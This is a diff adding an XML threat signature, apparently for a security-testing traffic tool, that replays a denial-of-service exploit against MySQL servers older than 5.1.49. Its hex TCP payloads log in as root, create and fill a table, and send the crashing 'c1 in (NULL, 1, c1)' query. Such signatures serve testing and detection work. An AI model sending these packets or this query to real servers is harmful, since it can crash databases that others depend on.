@@ -1,0 +1,268 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Oracle MySQL Database IN and CASE NULL Argument Denial of Service"/>
+    <EngDesc display="true" value="A Denial of Service vulnerability exists in Oracle MySQL database server. The vulnerability is due to an error while handling IN or CASE functions when NULL arguments are passed to the functions either by the WITH ROLLUP modifier or explicitly. Remote authenticated attackers can exploit this vulnerability by sending malicious command packets to the server.&#13;&#10;Successful exploitation would cause the target server to terminate, denying service to all users until the server is restarted."/>
+    <Intent display="true">
+      <item value="DENIAL_OF_SERVICE"/>
+    </Intent>
+    <Protocol display="true" value="MySQL"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Oracle"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="MySQL"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="prior_to_5.1.49"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="Will Wang"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="MEDIUM"/>
+    <Authentication display="false" value="SINGLE"/>
+    <ConfImpact display="false" value="NONE"/>
+    <IntegImpact display="false" value="NONE"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634211848324610658"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1285579817" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="srcIP" type="ImperfectControls.IPv4Address" value="null" index="Z"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="AA"/>
+    <NamedVar name="MYSQLdestPort" type="ImperfectControls.Port" value="null" index="AB"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="AA"/>
+      <for index="Z"/>
+      <for index="AB"/>
+    </for>
+    <for index="F">
+      <for index="Z"/>
+      <for index="AA"/>
+      <for index="AB"/>
+    </for>
+    <for index="G">
+      <for index="AA"/>
+      <for index="Z"/>
+      <for index="AB"/>
+    </for>
+    <for index="H">
+      <for index="Z"/>
+      <for index="AA"/>
+      <for index="AB"/>
+    </for>
+    <for index="I">
+      <for index="AA"/>
+      <for index="Z"/>
+      <for index="AB"/>
+    </for>
+    <for index="J">
+      <for index="Z"/>
+      <for index="AA"/>
+      <for index="AB"/>
+    </for>
+    <for index="K">
+      <for index="AA"/>
+      <for index="Z"/>
+      <for index="AB"/>
+    </for>
+    <for index="L">
+      <for index="Z"/>
+      <for index="AA"/>
+      <for index="AB"/>
+    </for>
+    <for index="M">
+      <for index="AA"/>
+      <for index="Z"/>
+      <for index="AB"/>
+    </for>
+    <for index="N">
+      <for index="Z"/>
+      <for index="AA"/>
+      <for index="AB"/>
+    </for>
+    <for index="O">
+      <for index="AA"/>
+      <for index="Z"/>
+      <for index="AB"/>
+    </for>
+    <for index="P">
+      <for index="Z"/>
+      <for index="AA"/>
+      <for index="AB"/>
+    </for>
+    <for index="Q">
+      <for index="AA"/>
+      <for index="Z"/>
+      <for index="AB"/>
+    </for>
+    <for index="R">
+      <for index="Z"/>
+      <for index="AA"/>
+      <for index="AB"/>
+    </for>
+    <for index="S">
+      <for index="AA"/>
+      <for index="Z"/>
+      <for index="AB"/>
+    </for>
+    <for index="T">
+      <for index="AA"/>
+      <for index="Z"/>
+      <for index="AB"/>
+    </for>
+    <for index="U">
+      <for index="Z"/>
+      <for index="AA"/>
+      <for index="AB"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="F" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:55:EA:78" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="08" TotalLength="" Identification="04BB" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="50722" destPort="$MYSQLdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="002E" Checksum="" UrgentPointer="0000" Options="0101080A9409A60800003B6F" Payload="3A00000185A2030000000001080000000000000000000000000000000000000000000000726F6F7400141D0FB7E113D4475ECFD48C7C09A7E2F9C121041A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="H" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:55:EA:78" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="08" TotalLength="" Identification="04BC" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="50722" destPort="$MYSQLdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="002E" Checksum="" UrgentPointer="0000" Options="0101080A9409A60A00003B6F" Payload="210000000373656C65637420404076657273696F6E5F636F6D6D656E74206C696D69742031" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="J" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:55:EA:78" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="08" TotalLength="" Identification="04BD" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="50722" destPort="$MYSQLdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="002E" Checksum="" UrgentPointer="0000" Options="0101080A9409A60C00003B6F" Payload="120000000353454C4543542044415441424153452829" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="L" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:55:EA:78" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="08" TotalLength="" Identification="04BE" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="50722" destPort="$MYSQLdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="002E" Checksum="" UrgentPointer="0000" Options="0101080A9409A60C00003B6F" Payload="050000000274657374" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="N" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:55:EA:78" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="08" TotalLength="" Identification="04BF" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="50722" destPort="$MYSQLdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="002E" Checksum="" UrgentPointer="0000" Options="0101080A9409A60F00003B6F" Payload="190000000364726F70207461626C652069662065786973747320706F63" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="P" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:55:EA:78" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="08" TotalLength="" Identification="04C0" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="50722" destPort="$MYSQLdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="002E" Checksum="" UrgentPointer="0000" Options="0101080A9409A61100003B6F" Payload="2800000003637265617465207461626C6520706F632028633120696E742920656E67696E653D6D796973616D" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="R" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:55:EA:78" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="08" TotalLength="" Identification="04C1" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="50722" destPort="$MYSQLdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="002E" Checksum="" UrgentPointer="0000" Options="0101080A9409A62C00003B6F" Payload="1A00000003696E7365727420696E746F20706F632076616C756573283129" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="T" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:55:EA:78" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="08" TotalLength="" Identification="04C2" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="50722" destPort="$MYSQLdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="002E" Checksum="" UrgentPointer="0000" Options="0101080A9409A63400003B70" Payload="260000000373656C6563742028633120696E20284E554C4C2C20312C20633129292066726F6D20706F63" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="U" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:55:EA:78" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="08" TotalLength="" Identification="04C3" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="50722" destPort="$MYSQLdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="002E" Checksum="" UrgentPointer="0000" Options="0101080A9409A70200003B70" Payload="260000000373656C6563742028633120696E20284E554C4C2C20312C20633129292066726F6D20706F63" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="0,2,4,6,8,10,12,14">
+    <Output index="D" Count="">
+      <Ethernet srcMac="00:0C:29:55:EA:78" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="" TypeofService="00" TotalLength="" Identification="63BA" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="" srcIP="$destIP" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$MYSQLdestPort" destPort="50722" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="FAF0" Checksum="" UrgentPointer="0000" Options="0101080A00003B6F9409A5D9" Payload="3E0000000A352E312E34372D636F6D6D756E6974790002000000326B4554573B5E4900FFF70802000000000000000000000000000034647E6E2E386E4340597E2F00" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="G" Count="">
+      <Ethernet srcMac="00:0C:29:55:EA:78" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="" TypeofService="00" TotalLength="" Identification="63BB" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="" srcIP="$destIP" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$MYSQLdestPort" destPort="50722" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="FAB2" Checksum="" UrgentPointer="0000" Options="0101080A00003B6F9409A608" Payload="0700000200000002000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="I" Count="">
+      <Ethernet srcMac="00:0C:29:55:EA:78" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="" TypeofService="00" TotalLength="" Identification="63BC" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="" srcIP="$destIP" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$MYSQLdestPort" destPort="50722" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="FA8D" Checksum="" UrgentPointer="0000" Options="0101080A00003B6F9409A60A" Payload="0100000101270000020364656600000011404076657273696F6E5F636F6D6D656E74000C08001C000000FD00001F000005000003FE000002001D0000041C4D7953514C20436F6D6D756E69747920536572766572202847504C2905000005FE00000200" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="K" Count="">
+      <Ethernet srcMac="00:0C:29:55:EA:78" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="" TypeofService="00" TotalLength="" Identification="63BD" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="" srcIP="$destIP" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$MYSQLdestPort" destPort="50722" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="FA77" Checksum="" UrgentPointer="0000" Options="0101080A00003B6F9409A60C" Payload="010000010120000002036465660000000A44415441424153452829000C080022000000FD00001F000005000003FE0000020001000004FB05000005FE00000200" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="M" Count="">
+      <Ethernet srcMac="00:0C:29:55:EA:78" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="" TypeofService="00" TotalLength="" Identification="63BE" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="" srcIP="$destIP" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$MYSQLdestPort" destPort="50722" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="FA6E" Checksum="" UrgentPointer="0000" Options="0101080A00003B6F9409A60C" Payload="0700000100000002000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="O" Count="">
+      <Ethernet srcMac="00:0C:29:55:EA:78" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="" TypeofService="00" TotalLength="" Identification="63BF" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="" srcIP="$destIP" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$MYSQLdestPort" destPort="50722" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="FA51" Checksum="" UrgentPointer="0000" Options="0101080A00003B6F9409A60C" Payload="0700000100000002000100" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="Q" Count="">
+      <Ethernet srcMac="00:0C:29:55:EA:78" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="" TypeofService="00" TotalLength="" Identification="63C0" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="" srcIP="$destIP" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$MYSQLdestPort" destPort="50722" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="FA25" Checksum="" UrgentPointer="0000" Options="0101080A00003B6F9409A611" Payload="0700000100000002000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="S" Count="">
+      <Ethernet srcMac="00:0C:29:55:EA:78" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="" TypeofService="00" TotalLength="" Identification="63C1" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="" srcIP="$destIP" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$MYSQLdestPort" destPort="50722" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="FA07" Checksum="" UrgentPointer="0000" Options="0101080A00003B709409A62C" Payload="0700000100010002000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
